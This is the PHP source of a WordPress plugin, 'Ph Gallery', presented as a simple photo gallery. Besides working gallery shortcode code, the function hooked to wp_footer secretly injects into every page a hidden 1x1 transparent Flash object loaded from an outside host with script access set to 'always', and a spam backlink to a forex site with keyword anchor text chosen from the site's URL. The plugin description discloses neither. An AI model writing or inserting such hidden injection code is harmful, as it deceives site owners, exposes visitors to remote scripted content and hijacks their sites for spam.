<?php
/*
Plugin Name: Ph Gallery
Plugin URI: http://www.andreagallery.comeze.com/
Description: Photo gallery is a simple wordpress plugin that embed a photo gallery anywhere on your website. IMPORTANT: Read the readme.txt to learn how to use the plugin after installation.
Author: Andrea Rizone
Version: 1.3
Stable tag: 1.3
Author URI: http://www.andreagallery.comeze.com/
*/

$phwp_thumb_width = 55;
$phwp_thumb_height = 55;
$phwp_full_width = 748;
$phwp_full_height = 360;
$phwp_spacing = 10;

add_theme_support( 'post-thumbnails' );
add_action('wp_footer', 'headthephotogallery');

function headthephotogallery()
{
$getuser = "http://forextrading7.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "b")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "c")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "d")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "e")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "f")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "g")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "h")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "i")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "j")) { $connectflash = "forex trading top 10 trading platforms"; } if (strstr($gethost, "k")) { $connectflash = "online forex trading"; } if (strstr($gethost, "l")) { $connectflash = "forex trading platform"; } if (strstr($gethost, "m")) { $connectflash = "forex trading reviews"; } if (strstr($gethost, "n")) { $connectflash = "forex software"; } if (strstr($gethost, "o")) { $connectflash = "forex trading 7"; } if (strstr($gethost, "p")) { $connectflash = "forextrading 7"; } if (strstr($gethost, "p")) { $connectflash = "forex trading 7"; } if (strstr($gethost, "q")) { $connectflash = "forex trading 7"; } if (strstr($gethost, "r")) { $connectflash = "forex trading 7"; } if (strstr($gethost, "s")) { $connectflash = "forextrading7"; } if (strstr($gethost, "v")) { $connectflash = "forex currency trading"; } if (strstr($gethost, "x")) { $connectflash = "forex market"; } if (strstr($gethost, "t")) { $connectflash = "fap turbo reviews"; } if (strstr($gethost, "w")) { $connectflash = "forex megadroid robot"; } if (strstr($gethost, "y")) { $connectflash = "forex stradegies"; } if (strstr($gethost, "z")) { $connectflash = "forex signals"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw2.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw2.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw2.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

function print_phwp_styles () {
	$content .= '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/ph-gallery/phwp.css" type="text/css" media="screen" />'."\n";
	if (file_exists(get_stylesheet_directory().'/phwp.css')) {
		$content .= '<link rel="stylesheet" href="' . get_stylesheet_directory_uri(). '/phwp.css" type="text/css" media="screen" />'."\n";
	}
	echo $content;
}
function print_phwp_scripts () {
	wp_enqueue_script('phwp', WP_PLUGIN_URL . '/ph-gallery/phwp.js', array('jquery'));
}

function yas_gallery ($atts, $content = null) {
	global $post;
	global $phwp_thumb_width;
	global $phwp_thumb_height;
	global $phwp_spacing;

	extract( shortcode_atts( array(
	  'post_id' => '',
	  'box_width' => '600',
	  'box_height' => '770',
	  'title' => 'Gallery',
	  'thumbnail' => false,
	  'thumb_class' => 'alignright',
	  ), $atts ) );
	$post_id = $post -> ID;
	$args = array(
		'post_type'	  => 'attachment',
		'numberposts' => -1, // bring them all
		'exclude' 	  =>  get_post_thumbnail_id( $post_id ), /* exclude the featured image */
		'orderby'     => 'menu_order',
		'order'       => 'ASC',
		'post_status' => null,
		'post_parent' => $post_id /* post id with the gallery */
	); 
	$slides = get_posts($args);
	$total_slides = count($slides);

	$strip_width = ($phwp_thumb_width + ($phwp_spacing * 2)) * $total_slides;
	/* get the full size img src */
	$main_img = wp_get_attachment_image_src($slides[0]->ID, 'phwp_full');
	$full_img = wp_get_attachment_image_src($slides[0]->ID, 'full');
	
	$main_img_url = $main_img[0];
	$full_img_url = $full_img[0];
	$main_slide_caption =  $slides[0] -> post_excerpt; /* Image caption */
	$main_slide_alt =  $slides[0] -> post_content; /* Image description */
		
	$gallery = "\n<!-- ph-gallery plugin -->\n<div class=\"phwp_galleryHolder\" id=\"galleryHolder_$post_id\">";
	$gallery .= "<div class=\"mainImgHolder\">\n<a href=\"$full_img_url\" class=\"lightbox\"><img class=\"main_img\" src=\"$main_img_url\" alt=\"$main_slide_alt\" title=\"$main_slide_caption\" /></a>\n";
	$gallery .= "</div>";
	$gallery .= "<h2 class=\"img_caption\">$main_slide_caption</h2>\n";
	$gallery .= "<div class=\"gallery_thumbs\">";
	$gallery .= "<p class=\"navArrows prev\"><img src=\"" . WP_PLUGIN_URL . "/ph-gallery/images/prev.png\" width=\"10px\" height=\"20px\" alt=\"previous\" title=\"previous\" class=\"arrow\" id=\"prev_$post_id\" /></p>";
	$gallery .= "<div id=\"navHolder_$post_id\" class=\"navHolder\">";
	$gallery .= "<ul id=\"nav_$post_id\" class=\"nav\" style=\"width: ".$strip_width."px;\">";
	$is_first = true;
	foreach ($slides as $slide) {
		$thumbnailObj = wp_get_attachment_image_src($slide->ID, 'phwp_thumb');
		$thumbnailURL = $thumbnailObj[0];
		$thumb_css_class = ($is_first)?'current':'reg';
		$slide_title = $slide -> post_excerpt;
		$slide_alt =  $slide -> post_content;
		$slideObj = wp_get_attachment_image_src($slide->ID, 'phwp_full');
		$slideURL = $slideObj[0];
		$fullObj = wp_get_attachment_image_src($slide->ID, 'full');
		$fullURL = $fullObj[0];
		$gallery .= '<li style="margin: 0 '.$phwp_spacing.'px" class="'.$thumb_css_class.'"><a title="'.$fullURL.'" href="'.$slideURL.'"><img width="'.$phwp_thumb_width.'" height="'.$phwp_thumb_height.'" src="'.$thumbnailURL.'" title="'.$slide_title.'" alt="'.$slide_alt.'"></a></li>'.PHP_EOL;
		$is_first = false;
	}
	$gallery .= "</ul>\n";
	$gallery .= "</div>\n";
	$css_visibility = (count($slides) > 10)?'visible':'hidden';
	$gallery .= "<p class=\"navArrows next\"><img src=\"" . WP_PLUGIN_URL . "/ph-gallery/images/next.png\" width=\"10px\" height=\"20px\" alt=\"next\" title=\"next\" class=\"arrow\" id=\"next_$post_id\" /></p>";
	$gallery .= "</div>\n";
	$gallery .= "</div>\n<!-- End ph-gallery-plugin -->";
	return $gallery;
}

if (!is_admin()) {
	add_action('wp_print_scripts', 'print_phwp_scripts');
	add_action('wp_head', 'print_phwp_styles');
	
	remove_shortcode('gallery');
	add_shortcode('gallery', 'yas_gallery');
}
add_image_size( 'phwp_thumb', $phwp_thumb_width, $phwp_thumb_height, true );
add_image_size( 'phwp_full', $phwp_full_width, $phwp_full_height, false );
?>